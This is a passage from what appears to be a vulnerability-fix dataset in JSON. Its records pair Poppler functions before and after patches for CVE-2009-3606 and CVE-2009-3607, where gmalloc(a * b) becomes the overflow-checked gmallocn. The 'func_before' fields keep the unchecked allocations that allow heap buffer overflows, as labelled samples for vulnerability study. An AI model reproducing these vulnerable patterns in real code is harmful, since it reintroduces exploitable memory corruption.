        "diff_func": "--- func_before\n+++ func_after\n@@ -90,7 +90,7 @@\n       break;\n     case splashModeRGB8:\n     case splashModeBGR8:\n-      imgData.lookup = (SplashColorPtr)gmalloc(3 * n);\n+      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getRGB(&pix, &rgb);\n@@ -100,7 +100,7 @@\n       }\n       break;\n     case splashModeXBGR8:\n-      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n+      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getRGB(&pix, &rgb);\n@@ -112,7 +112,7 @@\n       break;\n #if SPLASH_CMYK\n     case splashModeCMYK8:\n-      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n+      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getCMYK(&pix, &cmyk);",
        "diff_line_info": {
            "deleted_lines": [
                "      imgData.lookup = (SplashColorPtr)gmalloc(3 * n);",
                "      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);",
                "      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);"
            ],
            "added_lines": [
                "      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);",
                "      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);",
                "      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/SplashOutputDev::drawMaskedImage",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void SplashOutputDev::drawMaskedImage(GfxState *state, Object *ref,\n\t\t\t\t      Stream *str, int width, int height,\n\t\t\t\t      GfxImageColorMap *colorMap,\n\t\t\t\t      Stream *maskStr, int maskWidth,\n\t\t\t\t      int maskHeight, GBool maskInvert) {\n  GfxImageColorMap *maskColorMap;\n  Object maskDecode, decodeLow, decodeHigh;\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutMaskedImageData imgData;\n  SplashOutImageMaskData imgMaskData;\n  SplashColorMode srcMode;\n  SplashBitmap *maskBitmap;\n  Splash *maskSplash;\n  SplashColor maskColor;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  // If the mask is higher resolution than the image, use\n  // drawSoftMaskedImage() instead.\n  if (maskWidth > width || maskHeight > height) {\n    decodeLow.initInt(maskInvert ? 0 : 1);\n    decodeHigh.initInt(maskInvert ? 1 : 0);\n    maskDecode.initArray(xref);\n    maskDecode.arrayAdd(&decodeLow);\n    maskDecode.arrayAdd(&decodeHigh);\n    maskColorMap = new GfxImageColorMap(1, &maskDecode,\n\t\t\t\t\tnew GfxDeviceGrayColorSpace());\n    maskDecode.free();\n    drawSoftMaskedImage(state, ref, str, width, height, colorMap,\n\t\t\tmaskStr, maskWidth, maskHeight, maskColorMap);\n    delete maskColorMap;\n\n  } else {\n\n    //----- scale the mask image to the same size as the source image\n\n    mat[0] = (SplashCoord)width;\n    mat[1] = 0;\n    mat[2] = 0;\n    mat[3] = (SplashCoord)height;\n    mat[4] = 0;\n    mat[5] = 0;\n    imgMaskData.imgStr = new ImageStream(maskStr, maskWidth, 1, 1);\n    imgMaskData.imgStr->reset();\n    imgMaskData.invert = maskInvert ? 0 : 1;\n    imgMaskData.width = maskWidth;\n    imgMaskData.height = maskHeight;\n    imgMaskData.y = 0;\n    maskBitmap = new SplashBitmap(width, height, 1, splashModeMono1, gFalse);\n    maskSplash = new Splash(maskBitmap, gFalse);\n    maskColor[0] = 0;\n    maskSplash->clear(maskColor);\n    maskColor[0] = 0xff;\n    maskSplash->setFillPattern(new SplashSolidColor(maskColor));\n    maskSplash->fillImageMask(&imageMaskSrc, &imgMaskData,\n\t\t\t      maskWidth, maskHeight, mat, gFalse);\n    delete imgMaskData.imgStr;\n    maskStr->close();\n    delete maskSplash;\n\n    //----- draw the source image\n\n    ctm = state->getCTM();\n    mat[0] = ctm[0];\n    mat[1] = ctm[1];\n    mat[2] = -ctm[2];\n    mat[3] = -ctm[3];\n    mat[4] = ctm[2] + ctm[4];\n    mat[5] = ctm[3] + ctm[5];\n\n    imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t     colorMap->getNumPixelComps(),\n\t\t\t\t     colorMap->getBits());\n    imgData.imgStr->reset();\n    imgData.colorMap = colorMap;\n    imgData.mask = maskBitmap;\n    imgData.colorMode = colorMode;\n    imgData.width = width;\n    imgData.height = height;\n    imgData.y = 0;\n\n    // special case for one-channel (monochrome/gray/separation) images:\n    // build a lookup table here\n    imgData.lookup = NULL;\n    if (colorMap->getNumPixelComps() == 1) {\n      n = 1 << colorMap->getBits();\n      switch (colorMode) {\n      case splashModeMono1:\n      case splashModeMono8:\n\timgData.lookup = (SplashColorPtr)gmalloc(n);\n\tfor (i = 0; i < n; ++i) {\n\t  pix = (Guchar)i;\n\t  colorMap->getGray(&pix, &gray);\n\t  imgData.lookup[i] = colToByte(gray);\n\t}\n\tbreak;\n      case splashModeRGB8:\n      case splashModeBGR8:\n\timgData.lookup = (SplashColorPtr)gmalloc(3 * n);\n\tfor (i = 0; i < n; ++i) {\n\t  pix = (Guchar)i;\n\t  colorMap->getRGB(&pix, &rgb);\n\t  imgData.lookup[3*i] = colToByte(rgb.r);\n\t  imgData.lookup[3*i+1] = colToByte(rgb.g);\n\t  imgData.lookup[3*i+2] = colToByte(rgb.b);\n\t}\n\tbreak;\n      case splashModeXBGR8:\n\timgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n\tfor (i = 0; i < n; ++i) {\n\t  pix = (Guchar)i;\n\t  colorMap->getRGB(&pix, &rgb);\n\t  imgData.lookup[4*i] = colToByte(rgb.r);\n\t  imgData.lookup[4*i+1] = colToByte(rgb.g);\n\t  imgData.lookup[4*i+2] = colToByte(rgb.b);\n\t  imgData.lookup[4*i+3] = 255;\n\t}\n\tbreak;\n#if SPLASH_CMYK\n      case splashModeCMYK8:\n\timgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n\tfor (i = 0; i < n; ++i) {\n\t  pix = (Guchar)i;\n\t  colorMap->getCMYK(&pix, &cmyk);\n\t  imgData.lookup[4*i] = colToByte(cmyk.c);\n\t  imgData.lookup[4*i+1] = colToByte(cmyk.m);\n\t  imgData.lookup[4*i+2] = colToByte(cmyk.y);\n\t  imgData.lookup[4*i+3] = colToByte(cmyk.k);\n\t}\n\tbreak;\n#endif\n      }\n    }\n\n    if (colorMode == splashModeMono1) {\n      srcMode = splashModeMono8;\n    } else {\n      srcMode = colorMode;\n    }\n    splash->drawImage(&maskedImageSrc, &imgData, srcMode, gTrue,\n\t\t      width, height, mat);\n\n    delete maskBitmap;\n    gfree(imgData.lookup);\n    delete imgData.imgStr;\n    str->close();\n  }\n}",
        "func": "void SplashOutputDev::drawMaskedImage(GfxState *state, Object *ref,\n\t\t\t\t      Stream *str, int width, int height,\n\t\t\t\t      GfxImageColorMap *colorMap,\n\t\t\t\t      Stream *maskStr, int maskWidth,\n\t\t\t\t      int maskHeight, GBool maskInvert) {\n  GfxImageColorMap *maskColorMap;\n  Object maskDecode, decodeLow, decodeHigh;\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutMaskedImageData imgData;\n  SplashOutImageMaskData imgMaskData;\n  SplashColorMode srcMode;\n  SplashBitmap *maskBitmap;\n  Splash *maskSplash;\n  SplashColor maskColor;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  // If the mask is higher resolution than the image, use\n  // drawSoftMaskedImage() instead.\n  if (maskWidth > width || maskHeight > height) {\n    decodeLow.initInt(maskInvert ? 0 : 1);\n    decodeHigh.initInt(maskInvert ? 1 : 0);\n    maskDecode.initArray(xref);\n    maskDecode.arrayAdd(&decodeLow);\n    maskDecode.arrayAdd(&decodeHigh);\n    maskColorMap = new GfxImageColorMap(1, &maskDecode,\n\t\t\t\t\tnew GfxDeviceGrayColorSpace());\n    maskDecode.free();\n    drawSoftMaskedImage(state, ref, str, width, height, colorMap,\n\t\t\tmaskStr, maskWidth, maskHeight, maskColorMap);\n    delete maskColorMap;\n\n  } else {\n\n    //----- scale the mask image to the same size as the source image\n\n    mat[0] = (SplashCoord)width;\n    mat[1] = 0;\n    mat[2] = 0;\n    mat[3] = (SplashCoord)height;\n    mat[4] = 0;\n    mat[5] = 0;\n    imgMaskData.imgStr = new ImageStream(maskStr, maskWidth, 1, 1);\n    imgMaskData.imgStr->reset();\n    imgMaskData.invert = maskInvert ? 0 : 1;\n    imgMaskData.width = maskWidth;\n    imgMaskData.height = maskHeight;\n    imgMaskData.y = 0;\n    maskBitmap = new SplashBitmap(width, height, 1, splashModeMono1, gFalse);\n    maskSplash = new Splash(maskBitmap, gFalse);\n    maskColor[0] = 0;\n    maskSplash->clear(maskColor);\n    maskColor[0] = 0xff;\n    maskSplash->setFillPattern(new SplashSolidColor(maskColor));\n    maskSplash->fillImageMask(&imageMaskSrc, &imgMaskData,\n\t\t\t      maskWidth, maskHeight, mat, gFalse);\n    delete imgMaskData.imgStr;\n    maskStr->close();\n    delete maskSplash;\n\n    //----- draw the source image\n\n    ctm = state->getCTM();\n    mat[0] = ctm[0];\n    mat[1] = ctm[1];\n    mat[2] = -ctm[2];\n    mat[3] = -ctm[3];\n    mat[4] = ctm[2] + ctm[4];\n    mat[5] = ctm[3] + ctm[5];\n\n    imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t     colorMap->getNumPixelComps(),\n\t\t\t\t     colorMap->getBits());\n    imgData.imgStr->reset();\n    imgData.colorMap = colorMap;\n    imgData.mask = maskBitmap;\n    imgData.colorMode = colorMode;\n    imgData.width = width;\n    imgData.height = height;\n    imgData.y = 0;\n\n    // special case for one-channel (monochrome/gray/separation) images:\n    // build a lookup table here\n    imgData.lookup = NULL;\n    if (colorMap->getNumPixelComps() == 1) {\n      n = 1 << colorMap->getBits();\n      switch (colorMode) {\n      case splashModeMono1:\n      case splashModeMono8:\n\timgData.lookup = (SplashColorPtr)gmalloc(n);\n\tfor (i = 0; i < n; ++i) {\n\t  pix = (Guchar)i;\n\t  colorMap->getGray(&pix, &gray);\n\t  imgData.lookup[i] = colToByte(gray);\n\t}\n\tbreak;\n      case splashModeRGB8:\n      case splashModeBGR8:\n\timgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n\tfor (i = 0; i < n; ++i) {\n\t  pix = (Guchar)i;\n\t  colorMap->getRGB(&pix, &rgb);\n\t  imgData.lookup[3*i] = colToByte(rgb.r);\n\t  imgData.lookup[3*i+1] = colToByte(rgb.g);\n\t  imgData.lookup[3*i+2] = colToByte(rgb.b);\n\t}\n\tbreak;\n      case splashModeXBGR8:\n\timgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n\tfor (i = 0; i < n; ++i) {\n\t  pix = (Guchar)i;\n\t  colorMap->getRGB(&pix, &rgb);\n\t  imgData.lookup[4*i] = colToByte(rgb.r);\n\t  imgData.lookup[4*i+1] = colToByte(rgb.g);\n\t  imgData.lookup[4*i+2] = colToByte(rgb.b);\n\t  imgData.lookup[4*i+3] = 255;\n\t}\n\tbreak;\n#if SPLASH_CMYK\n      case splashModeCMYK8:\n\timgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n\tfor (i = 0; i < n; ++i) {\n\t  pix = (Guchar)i;\n\t  colorMap->getCMYK(&pix, &cmyk);\n\t  imgData.lookup[4*i] = colToByte(cmyk.c);\n\t  imgData.lookup[4*i+1] = colToByte(cmyk.m);\n\t  imgData.lookup[4*i+2] = colToByte(cmyk.y);\n\t  imgData.lookup[4*i+3] = colToByte(cmyk.k);\n\t}\n\tbreak;\n#endif\n      }\n    }\n\n    if (colorMode == splashModeMono1) {\n      srcMode = splashModeMono8;\n    } else {\n      srcMode = colorMode;\n    }\n    splash->drawImage(&maskedImageSrc, &imgData, srcMode, gTrue,\n\t\t      width, height, mat);\n\n    delete maskBitmap;\n    gfree(imgData.lookup);\n    delete imgData.imgStr;\n    str->close();\n  }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -102,7 +102,7 @@\n \tbreak;\n       case splashModeRGB8:\n       case splashModeBGR8:\n-\timgData.lookup = (SplashColorPtr)gmalloc(3 * n);\n+\timgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n \tfor (i = 0; i < n; ++i) {\n \t  pix = (Guchar)i;\n \t  colorMap->getRGB(&pix, &rgb);\n@@ -112,7 +112,7 @@\n \t}\n \tbreak;\n       case splashModeXBGR8:\n-\timgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n+\timgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n \tfor (i = 0; i < n; ++i) {\n \t  pix = (Guchar)i;\n \t  colorMap->getRGB(&pix, &rgb);\n@@ -124,7 +124,7 @@\n \tbreak;\n #if SPLASH_CMYK\n       case splashModeCMYK8:\n-\timgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n+\timgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n \tfor (i = 0; i < n; ++i) {\n \t  pix = (Guchar)i;\n \t  colorMap->getCMYK(&pix, &cmyk);",
        "diff_line_info": {
            "deleted_lines": [
                "\timgData.lookup = (SplashColorPtr)gmalloc(3 * n);",
                "\timgData.lookup = (SplashColorPtr)gmalloc(4 * n);",
                "\timgData.lookup = (SplashColorPtr)gmalloc(4 * n);"
            ],
            "added_lines": [
                "\timgData.lookup = (SplashColorPtr)gmallocn(n, 3);",
                "\timgData.lookup = (SplashColorPtr)gmallocn(n, 4);",
                "\timgData.lookup = (SplashColorPtr)gmallocn(n, 4);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/PSOutputDev::doImageL1Sep",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void PSOutputDev::doImageL1Sep(GfxImageColorMap *colorMap,\n\t\t\t       GBool invert, GBool inlineImg,\n\t\t\t       Stream *str, int width, int height, int len) {\n  ImageStream *imgStr;\n  Guchar *lineBuf;\n  Guchar pixBuf[gfxColorMaxComps];\n  GfxCMYK cmyk;\n  int x, y, i, comp;\n\n  // width, height, matrix, bits per component\n  writePSFmt(\"{0:d} {1:d} 8 [{2:d} 0 0 {3:d} 0 {4:d}] pdfIm1Sep\\n\",\n\t     width, height,\n\t     width, -height, height);\n\n  // allocate a line buffer\n  lineBuf = (Guchar *)gmalloc(4 * width);\n\n  // set up to process the data stream\n  imgStr = new ImageStream(str, width, colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n\n  // process the data stream\n  i = 0;\n  for (y = 0; y < height; ++y) {\n\n    // read the line\n    for (x = 0; x < width; ++x) {\n      imgStr->getPixel(pixBuf);\n      colorMap->getCMYK(pixBuf, &cmyk);\n      lineBuf[4*x+0] = colToByte(cmyk.c);\n      lineBuf[4*x+1] = colToByte(cmyk.m);\n      lineBuf[4*x+2] = colToByte(cmyk.y);\n      lineBuf[4*x+3] = colToByte(cmyk.k);\n      addProcessColor(colToDbl(cmyk.c), colToDbl(cmyk.m),\n\t\t      colToDbl(cmyk.y), colToDbl(cmyk.k));\n    }\n\n    // write one line of each color component\n    for (comp = 0; comp < 4; ++comp) {\n      for (x = 0; x < width; ++x) {\n\twritePSFmt(\"{0:02x}\", lineBuf[4*x + comp]);\n\tif (++i == 32) {\n\t  writePSChar('\\n');\n\t  i = 0;\n\t}\n      }\n    }\n  }\n\n  if (i != 0) {\n    writePSChar('\\n');\n  }\n\n  str->close();\n  delete imgStr;\n  gfree(lineBuf);\n}",
        "func": "void PSOutputDev::doImageL1Sep(GfxImageColorMap *colorMap,\n\t\t\t       GBool invert, GBool inlineImg,\n\t\t\t       Stream *str, int width, int height, int len) {\n  ImageStream *imgStr;\n  Guchar *lineBuf;\n  Guchar pixBuf[gfxColorMaxComps];\n  GfxCMYK cmyk;\n  int x, y, i, comp;\n\n  // width, height, matrix, bits per component\n  writePSFmt(\"{0:d} {1:d} 8 [{2:d} 0 0 {3:d} 0 {4:d}] pdfIm1Sep\\n\",\n\t     width, height,\n\t     width, -height, height);\n\n  // allocate a line buffer\n  lineBuf = (Guchar *)gmallocn(width, 4);\n\n  // set up to process the data stream\n  imgStr = new ImageStream(str, width, colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n\n  // process the data stream\n  i = 0;\n  for (y = 0; y < height; ++y) {\n\n    // read the line\n    for (x = 0; x < width; ++x) {\n      imgStr->getPixel(pixBuf);\n      colorMap->getCMYK(pixBuf, &cmyk);\n      lineBuf[4*x+0] = colToByte(cmyk.c);\n      lineBuf[4*x+1] = colToByte(cmyk.m);\n      lineBuf[4*x+2] = colToByte(cmyk.y);\n      lineBuf[4*x+3] = colToByte(cmyk.k);\n      addProcessColor(colToDbl(cmyk.c), colToDbl(cmyk.m),\n\t\t      colToDbl(cmyk.y), colToDbl(cmyk.k));\n    }\n\n    // write one line of each color component\n    for (comp = 0; comp < 4; ++comp) {\n      for (x = 0; x < width; ++x) {\n\twritePSFmt(\"{0:02x}\", lineBuf[4*x + comp]);\n\tif (++i == 32) {\n\t  writePSChar('\\n');\n\t  i = 0;\n\t}\n      }\n    }\n  }\n\n  if (i != 0) {\n    writePSChar('\\n');\n  }\n\n  str->close();\n  delete imgStr;\n  gfree(lineBuf);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -13,7 +13,7 @@\n \t     width, -height, height);\n \n   // allocate a line buffer\n-  lineBuf = (Guchar *)gmalloc(4 * width);\n+  lineBuf = (Guchar *)gmallocn(width, 4);\n \n   // set up to process the data stream\n   imgStr = new ImageStream(str, width, colorMap->getNumPixelComps(),",
        "diff_line_info": {
            "deleted_lines": [
                "  lineBuf = (Guchar *)gmalloc(4 * width);"
            ],
            "added_lines": [
                "  lineBuf = (Guchar *)gmallocn(width, 4);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/PSOutputDev::setupExternalCIDTrueTypeFont",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "GooString *PSOutputDev::setupExternalCIDTrueTypeFont(GfxFont *font, GooString *fileName, int faceIndex) {\n  FoFiTrueType *ffTT;\n  Gushort *codeToGID;\n  GooString *psName;\n  int i;\n  GooString *myFileName;\n\n  myFileName = fileName->copy();\n  if (faceIndex > 0) {\n    char tmp[32];\n    sprintf(tmp, \",%d\", faceIndex);\n    myFileName->append(tmp);\n  }\n  // check if font is already embedded\n  for (i = 0; i < fontFileNameLen; ++i) {\n    if (!fontFileNames[i]->cmp(myFileName)) {\n      delete myFileName;\n      return psFileNames[i]->copy();\n    }\n  }\n\n  psName = font->getName()->sanitizedName(gTrue /* ps mode */);\n  // add entry to fontFileNames list\n  if (i == fontFileNameLen) {\n    if (fontFileNameLen >= fontFileNameSize) {\n      fontFileNameSize += 64;\n      fontFileNames =\n\t(GooString **)grealloc(fontFileNames,\n\t\t\t     fontFileNameSize * sizeof(GooString *));\n      psFileNames =\n\t(GooString **)grealloc(psFileNames,\n\t\t\t     fontFileNameSize * sizeof(GooString *));\n    }\n  }\n  fontFileNames[fontFileNameLen] = myFileName;\n  psFileNames[fontFileNameLen] = psName->copy();\n  fontFileNameLen++;\n\n  // beginning comment\n  writePSFmt(\"%%BeginResource: font {0:t}\\n\", psName);\n  embFontList->append(\"%%+ font \");\n  embFontList->append(psName->getCString());\n  embFontList->append(\"\\n\");\n\n  // convert it to a CID type2 font\n  if ((ffTT = FoFiTrueType::load(fileName->getCString(), faceIndex))) {\n      int n = ((GfxCIDFont *)font)->getCIDToGIDLen();\n      if (n) {\n\tcodeToGID = (Gushort *)gmalloc(n * sizeof(Gushort));\n\tmemcpy(codeToGID, ((GfxCIDFont *)font)->getCIDToGID(), n * sizeof(Gushort));\n      } else {\n\tcodeToGID = ((GfxCIDFont *)font)->getCodeToGIDMap(ffTT, &n);\n      }\n      if (globalParams->getPSLevel() >= psLevel3) {\n\t// Level 3: use a CID font\n\tffTT->convertToCIDType2(psName->getCString(),\n\t\t\t\tcodeToGID, n, gTrue,\n\t\t\t\toutputFunc, outputStream);\n      } else {\n\t// otherwise: use a non-CID composite font\n\tffTT->convertToType0(psName->getCString(),\n\t\t\t     codeToGID, n, gTrue,\n\t\t\t     outputFunc, outputStream);\n      }\n      gfree(codeToGID);\n      delete ffTT;\n  }\n\n  // ending comment\n  writePS(\"%%EndResource\\n\");\n  return psName;\n}",
        "func": "GooString *PSOutputDev::setupExternalCIDTrueTypeFont(GfxFont *font, GooString *fileName, int faceIndex) {\n  FoFiTrueType *ffTT;\n  Gushort *codeToGID;\n  GooString *psName;\n  int i;\n  GooString *myFileName;\n\n  myFileName = fileName->copy();\n  if (faceIndex > 0) {\n    char tmp[32];\n    sprintf(tmp, \",%d\", faceIndex);\n    myFileName->append(tmp);\n  }\n  // check if font is already embedded\n  for (i = 0; i < fontFileNameLen; ++i) {\n    if (!fontFileNames[i]->cmp(myFileName)) {\n      delete myFileName;\n      return psFileNames[i]->copy();\n    }\n  }\n\n  psName = font->getName()->sanitizedName(gTrue /* ps mode */);\n  // add entry to fontFileNames list\n  if (i == fontFileNameLen) {\n    if (fontFileNameLen >= fontFileNameSize) {\n      fontFileNameSize += 64;\n      fontFileNames =\n\t(GooString **)grealloc(fontFileNames,\n\t\t\t     fontFileNameSize * sizeof(GooString *));\n      psFileNames =\n\t(GooString **)grealloc(psFileNames,\n\t\t\t     fontFileNameSize * sizeof(GooString *));\n    }\n  }\n  fontFileNames[fontFileNameLen] = myFileName;\n  psFileNames[fontFileNameLen] = psName->copy();\n  fontFileNameLen++;\n\n  // beginning comment\n  writePSFmt(\"%%BeginResource: font {0:t}\\n\", psName);\n  embFontList->append(\"%%+ font \");\n  embFontList->append(psName->getCString());\n  embFontList->append(\"\\n\");\n\n  // convert it to a CID type2 font\n  if ((ffTT = FoFiTrueType::load(fileName->getCString(), faceIndex))) {\n      int n = ((GfxCIDFont *)font)->getCIDToGIDLen();\n      if (n) {\n\tcodeToGID = (Gushort *)gmallocn(n, sizeof(Gushort));\n\tmemcpy(codeToGID, ((GfxCIDFont *)font)->getCIDToGID(), n * sizeof(Gushort));\n      } else {\n\tcodeToGID = ((GfxCIDFont *)font)->getCodeToGIDMap(ffTT, &n);\n      }\n      if (globalParams->getPSLevel() >= psLevel3) {\n\t// Level 3: use a CID font\n\tffTT->convertToCIDType2(psName->getCString(),\n\t\t\t\tcodeToGID, n, gTrue,\n\t\t\t\toutputFunc, outputStream);\n      } else {\n\t// otherwise: use a non-CID composite font\n\tffTT->convertToType0(psName->getCString(),\n\t\t\t     codeToGID, n, gTrue,\n\t\t\t     outputFunc, outputStream);\n      }\n      gfree(codeToGID);\n      delete ffTT;\n  }\n\n  // ending comment\n  writePS(\"%%EndResource\\n\");\n  return psName;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -46,7 +46,7 @@\n   if ((ffTT = FoFiTrueType::load(fileName->getCString(), faceIndex))) {\n       int n = ((GfxCIDFont *)font)->getCIDToGIDLen();\n       if (n) {\n-\tcodeToGID = (Gushort *)gmalloc(n * sizeof(Gushort));\n+\tcodeToGID = (Gushort *)gmallocn(n, sizeof(Gushort));\n \tmemcpy(codeToGID, ((GfxCIDFont *)font)->getCIDToGID(), n * sizeof(Gushort));\n       } else {\n \tcodeToGID = ((GfxCIDFont *)font)->getCodeToGIDMap(ffTT, &n);",
        "diff_line_info": {
            "deleted_lines": [
                "\tcodeToGID = (Gushort *)gmalloc(n * sizeof(Gushort));"
            ],
            "added_lines": [
                "\tcodeToGID = (Gushort *)gmallocn(n, sizeof(Gushort));"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/JBIG2Bitmap::JBIG2Bitmap",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "JBIG2Bitmap::JBIG2Bitmap(Guint segNumA, JBIG2Bitmap *bitmap):\n  JBIG2Segment(segNumA)\n{\n  w = bitmap->w;\n  h = bitmap->h;\n  line = bitmap->line;\n\n  if (w <= 0 || h <= 0 || line <= 0 || h >= (INT_MAX - 1) / line) {\n    error(-1, \"invalid width/height\");\n    data = NULL;\n    return;\n  }\n  // need to allocate one extra guard byte for use in combine()\n  data = (Guchar *)gmalloc(h * line + 1);\n  memcpy(data, bitmap->data, h * line);\n  data[h * line] = 0;\n}",
        "func": "JBIG2Bitmap::JBIG2Bitmap(Guint segNumA, JBIG2Bitmap *bitmap):\n  JBIG2Segment(segNumA)\n{\n  w = bitmap->w;\n  h = bitmap->h;\n  line = bitmap->line;\n\n  if (w <= 0 || h <= 0 || line <= 0 || h >= (INT_MAX - 1) / line) {\n    error(-1, \"invalid width/height\");\n    data = NULL;\n    return;\n  }\n  // need to allocate one extra guard byte for use in combine()\n  data = (Guchar *)gmallocn(h, line + 1);\n  memcpy(data, bitmap->data, h * line);\n  data[h * line] = 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -11,7 +11,7 @@\n     return;\n   }\n   // need to allocate one extra guard byte for use in combine()\n-  data = (Guchar *)gmalloc(h * line + 1);\n+  data = (Guchar *)gmallocn(h, line + 1);\n   memcpy(data, bitmap->data, h * line);\n   data[h * line] = 0;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "  data = (Guchar *)gmalloc(h * line + 1);"
            ],
            "added_lines": [
                "  data = (Guchar *)gmallocn(h, line + 1);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/JBIG2Bitmap::JBIG2Bitmap",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "JBIG2Bitmap::JBIG2Bitmap(Guint segNumA, int wA, int hA):\n  JBIG2Segment(segNumA)\n{\n  w = wA;\n  h = hA;\n  line = (wA + 7) >> 3;\n\n  if (w <= 0 || h <= 0 || line <= 0 || h >= (INT_MAX - 1) / line) {\n    error(-1, \"invalid width/height\");\n    data = NULL;\n    return;\n  }\n  // need to allocate one extra guard byte for use in combine()\n  data = (Guchar *)gmalloc(h * line + 1);\n  data[h * line] = 0;\n}",
        "func": "JBIG2Bitmap::JBIG2Bitmap(Guint segNumA, int wA, int hA):\n  JBIG2Segment(segNumA)\n{\n  w = wA;\n  h = hA;\n  line = (wA + 7) >> 3;\n\n  if (w <= 0 || h <= 0 || line <= 0 || h >= (INT_MAX - 1) / line) {\n    error(-1, \"invalid width/height\");\n    data = NULL;\n    return;\n  }\n  // need to allocate one extra guard byte for use in combine()\n  data = (Guchar *)gmallocn(h, line + 1);\n  data[h * line] = 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -11,6 +11,6 @@\n     return;\n   }\n   // need to allocate one extra guard byte for use in combine()\n-  data = (Guchar *)gmalloc(h * line + 1);\n+  data = (Guchar *)gmallocn(h, line + 1);\n   data[h * line] = 0;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "  data = (Guchar *)gmalloc(h * line + 1);"
            ],
            "added_lines": [
                "  data = (Guchar *)gmallocn(h, line + 1);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3607",
        "func_name": "poppler/create_surface_from_thumbnail_data",
        "description": "Integer overflow in the create_surface_from_thumbnail_data function in glib/poppler-page.cc in Poppler 0.x allows remote attackers to cause a denial of service (memory corruption) or possibly execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.  NOTE: some of these details are obtained from third party information.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/?id=c839b706",
        "commit_title": "",
        "commit_text": "",
